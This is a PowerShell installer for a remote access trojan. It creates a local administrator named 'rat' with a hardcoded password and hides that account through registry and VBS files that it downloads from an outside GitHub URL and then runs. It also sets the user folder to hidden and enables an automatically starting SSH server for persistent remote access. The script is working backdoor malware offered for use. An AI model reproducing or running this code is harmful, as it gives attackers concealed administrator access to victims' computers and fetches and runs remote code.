#build resources for RAT
# Created by : Luke O'Sullivan

#Random string for directorys
function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}
# create's local admin
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"

    }
    end {
    }
}
#create admin user
$NewLocalAdmin = "rat"
$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#goto temp and make working directory
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"

#visual bacic script to registor the registory
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"


##install the registry
./"wrev.reg"; ./"calty.vbs"

#Hide the Rat user in \Users
cd C:\Users
attrib +h +s +r rat


#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

## Variables
#$wd = random_text


#$path = "$env:temp/$wd"
#$initial_dir = Get-Location


#enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# 



# self delete
#cd $initial_dir
#del Installer.ps1